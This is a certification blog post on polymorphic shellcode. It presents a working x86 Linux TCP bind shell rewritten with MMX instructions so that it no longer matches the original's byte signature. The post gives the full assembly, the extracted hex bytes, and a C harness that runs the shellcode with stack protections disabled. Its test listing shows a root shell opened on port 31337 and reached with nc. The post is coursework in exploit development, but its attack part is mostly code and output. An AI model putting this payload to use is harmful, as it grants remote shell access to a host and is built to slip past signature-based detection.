---
title: SLAE32 Assignment 6.1 - Polymorphic MMX Bind Shell
date: 2019-9-5
layout: single
classes: wide
tags:
  - Bind
  - Shell
  - polymorphic
  - MMX
  - Assembly
  - SLAE
  - Linux
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
For the sixth assignment in the SLAE32 Exam, we needed to create 3 polymorphic shellcodes; from existing shellcodes at shell-storm.org.   
_What is Polymorphic Shellcode?_   
Polymorphic shellcode means that it uses different assembly instructions to deliver the same payload.    
For example, all of the below instructions will result in the same action.

```nasm
mov eax, 0x00000000      ; Clears the EAX Register
xor eax, eax             ; Clears the EAX Register
sub eax, eax             ; Clears the EAX Register
```

The first shellcode I modified was `tcpbindshell (108 bytes)`, created by Russell Willis.  
+ This shellcode can be found at `http://shell-storm.org/shellcode/files/shellcode-847.php`.  

Our assignment required that our polymorphic version of the shellcode to not exceed 150% of the original value.   
+ The original shellcode length is `108 bytes`. 
+ The final length of this polymorphic shellcode is `144 bytes`.    

## Polymorphic Shellcode
+ The code I added/modified is indented with one space.

```nasm
global _start
_start:
 xor	ecx,ecx   ; Makes the ECX Register 0
 mul	ecx       ; ECX*EAX. Result is stored in EDX:EAX. 
                  ;  This clears the EDX and EAX.
 mov ebx, eax     ; sets the EBX register to 0
 push byte 0x66
 pop edi          ; save this for the other functions
 mov eax, edi	  ; eax is now 0x66 which is the socketcall SYScal
 inc ebx          ; EBX = 1; needed to create the socket()
 push edx
push   0x6
 push ebx         ; push 0x1 to the stack 
push   0x2
mov    ecx,esp
int    0x80       ; System Call
 xchg esi,eax     ; Save the output of the syscal to the ESI register
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx          ; EBX = 0x2
push   edx
push word 0x697a  ; port TCP 
push   bx
mov    ecx,esp
push   0x10
push   ecx
push   esi
mov    ecx,esp
int    0x80       ; System Call
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx
 inc ebx          ; EBX = 0x4
push   0x1
push   esi
mov    ecx,esp
int    0x80       ; System Call
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx
push   edx
push   edx
push   esi
mov    ecx,esp
int    0x80       ; System Call
; setup dup2 loop
mov    ebx,eax
xor    ecx,ecx
mov    cl,0x3
; dup2
dup2Loop:
	dec ecx
mov    al,0x3f
int    0x80       ; System Call
jne    dup2Loop
push   edx
 mov edx, 0xffffffff     ; used to XOR the MM0 Register to result in "//bin/sh"
 mov eax, 0x978cd091     ; "n/sh" XOR'd with 0xffffffff
 movd mm0, eax
 psllq mm0, 32           ; shift the mm0 register left by 4 bytes
 mov ebx, 0x969dd0d0     ; "//bi" XOR'd with 0xffffffff
 movd mm1, ebx
 paddb mm0, mm1          ; now mm0 hold the 8 byte XOR'd "//bin/sh"
 movd mm1, edx           ; mm1 is now 0xffffffff
 psllq mm1, 32           ; mm1 is now 0xffffffff00000000
 movd mm2, edx           ; mm2 us biw 0xffffffff
 paddb mm1, mm2          ; mm1 is now 0xffffffffffffffff
 pxor mm0, mm1           ; XOR's mm0 with mm1 and saves the results in mm0
 sub esp, 8              ; Decrement the stack 8 bytes
 movq qword [esp], mm0   ; push "//bin/sh" from mm0 to the top of the stack
xor    eax,eax
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
push   eax
mov    edx,esp
mov    al,0xb
int    0x80       ; System Call
```  

+ To push the filename string `//bin/sh` onto the stack, I used the MMX registers.   

### Compiling the Shellcode

```console
root# nasm -f elf32 mmxTcpBindShell.nasm -o mmxTcpBindShell.o
root# ld mmxTcpBindShell.o -o mmxTcpBindShell
```

### Getting the Hex of the Shellcode

```console
root# objdump -d tcpBindShell  | grep '[0-9a-f]:' | grep -v 'file' | \
cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | \
sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x89\xc3\x6a\x66\x5f\x89\xf8\x43\x52\x6a\x06\x53\x6a\x02"
"\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a"
"\x10\x51\x56\x89\xe1\xcd\x80\x89\xf8\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80"
"\x89\xf8\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x49\xb0"
"\x3f\xcd\x80\x75\xf9\x52\xba\xff\xff\xff\xff\xb8\x91\xd0\x8c\x97\x0f\x6e"
"\xc0\x0f\x73\xf0\x20\xbb\xd0\xd0\x9d\x96\x0f\x6e\xcb\x0f\xfc\xc1\x0f\x6e"
"\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f"
"\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
``` 

### Injecting the Shellcode in a Host Program
+ I loaded it into our shellcode testing program to ensure it still worked when injected into a host program.  

```c
// Filename: shellcode.c
// Author:   boku
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc9\xf7\xe1\x89\xc3\x6a\x66\x5f\x89\xf8\x43\x52\x6a\x06\x53\x6a\x02"
"\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a"
"\x10\x51\x56\x89\xe1\xcd\x80\x89\xf8\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80"
"\x89\xf8\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x49\xb0"
"\x3f\xcd\x80\x75\xf9\x52\xba\xff\xff\xff\xff\xb8\x91\xd0\x8c\x97\x0f\x6e"
"\xc0\x0f\x73\xf0\x20\xbb\xd0\xd0\x9d\x96\x0f\x6e\xcb\x0f\xfc\xc1\x0f\x6e"
"\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f"
"\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
+ I then compiled the C program.  

#### Compiling the Host Program
```console
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
+ we use the feature `no-stack-protector` to disable canary stack protections that are automattically added when using the gcc compiler.
+ The option `execstack` disables the Data Execution Protection (DEP) mechanism automatically added when compiling with gcc. 
  - This makes the stack non-executable.
  - The stack would be only read and write if we didn't disable this.

### Testing the Polymorphic Shellcode
#### Window 1
```console
root# ./shellcode
Shellcode Length:  144
```

#### Window 2
```console
root# netstat -tnalp | grep shellcode
tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      19649/shellcode
root# nc 127.0.0.1 31337
whoami
root
```
+ Awesome! Our version of the shellcode works as intended.
+ Having no `root#` or `user$` is typical of bind shells.

## SLAE32 Blog Proof
```console
This blog post has been created for completing the requirements
 of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
	- Now at: https://www.pentesteracademy.com/course?id=3
SLAE/Student ID: PA-10913
```
